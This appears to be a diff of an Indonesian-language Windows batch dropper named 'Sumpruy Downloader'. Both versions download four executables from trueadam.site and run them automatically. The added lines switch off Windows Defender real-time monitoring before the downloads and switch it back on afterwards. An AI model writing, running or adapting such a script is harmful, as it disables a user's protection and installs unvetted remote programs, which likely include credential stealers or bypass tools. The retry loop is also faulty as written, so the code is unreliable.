@@ -1,57 +1,72 @@
 @echo off
-title Sumpruy V2
+title Sumpruy Downloader - Fixed
 set "DL_DIR=C:\Sumpruy_Downloads"
 mkdir "%DL_DIR%" 2>nul
 cd /d "%DL_DIR%"
 
-echo.
-echo ========================================
-echo MULAI DOWNLOAD BRO...
-echo ========================================
-echo.
-
-:: DOWNLOAD SATU PER SATU DENGAN URL LENGKAP
-echo 1. Downloading StarDesk.exe...
-powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/StarDesk.exe' -OutFile 'StarDesk.exe'"
-if %errorlevel%==0 (
-    echo ✅ StarDesk.exe OK
-    start "" "StarDesk.exe"
-) else (
-    echo ❌ Gagal download StarDesk.exe
-)
-
-echo.
-echo 2. Downloading informer.exe...
-powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/informer.exe' -OutFile 'informer.exe'"
-if %errorlevel%==0 (
-    echo ✅ informer.exe OK
-    start "" "informer.exe"
-) else (
-    echo ❌ Gagal download informer.exe
-)
-
-echo.
-echo 3. Downloading seeu.exe...
-powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/seeu.exe' -OutFile 'seeu.exe'"
-if %errorlevel%==0 (
-    echo ✅ seeu.exe OK
-    start "" "seeu.exe"
-) else (
-    echo ❌ Gagal download seeu.exe
-)
-
-echo.
-echo 4. Downloading Bypass Noir.exe...
-powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/Bypass%%20Noir.exe' -OutFile 'Bypass Noir.exe'"
-if %errorlevel%==0 (
-    echo ✅ Bypass Noir.exe OK
-    start "" "Bypass Noir.exe"
-) else (
-    echo ❌ Gagal download Bypass Noir.exe
-)
+:: Matiin antivirus sementara (kalau Windows Defender)
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
 echo.
 echo ========================================
-echo SELESAI SEMUA BRO. CEK DI C:\Sumpruy_Downloads
+echo MULAI DOWNLOAD DENGAN RETRY
+echo ========================================
+echo.
+
+:: DAFTAR FILE
+set "FILES=StarDesk.exe informer.exe seeu.exe Bypass Noir.exe"
+
+:: LOOP DOWNLOAD + RETRY 3 KALI
+for %%F in (%FILES%) do (
+    setlocal enabledelayedexpansion
+    set "FILE=%%F"
+    set "URL=https://trueadam.site/%%F"
+    
+    echo Downloading !FILE!...
+    set "TRY=1"
+    :retry
+    if !TRY! GTR 3 (
+        echo ❌ Gagal download !FILE! setelah 3 kali percobaan.
+        goto next
+    )
+    
+    :: HAPUS FILE LAMA
+    if exist "!FILE!" del "!FILE!"
+    
+    :: DOWNLOAD PAKAI CURL
+    curl -L -o "!FILE!" "!URL!" --silent --show-error
+    
+    :: CEK UKURAN
+    if exist "!FILE!" (
+        for %%Z in ("!FILE!") do (
+            if %%~zZ LSS 10240 (
+                echo ⚠️ File !FILE! terlalu kecil (%%~zZ bytes), mencoba ulang...
+                del "!FILE!"
+                set /a TRY=!TRY!+1
+                timeout /t 2 /nobreak >nul
+                goto retry
+            ) else (
+                echo ✅ !FILE! berhasil didownload (%%~zZ bytes)
+                timeout /t 1 /nobreak >nul
+                echo 🚀 Menjalankan !FILE! ...
+                start "" "!FILE!"
+            )
+        )
+    ) else (
+        echo ⚠️ !FILE! gagal download, mencoba ulang...
+        set /a TRY=!TRY!+1
+        timeout /t 2 /nobreak >nul
+        goto retry
+    )
+    :next
+    endlocal
+)
+
+:: Nyalakan lagi antivirus (opsional)
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+
+echo.
+echo ========================================
+echo SELESAI. CEK FOLDER C:\Sumpruy_Downloads
 echo ========================================
 pause
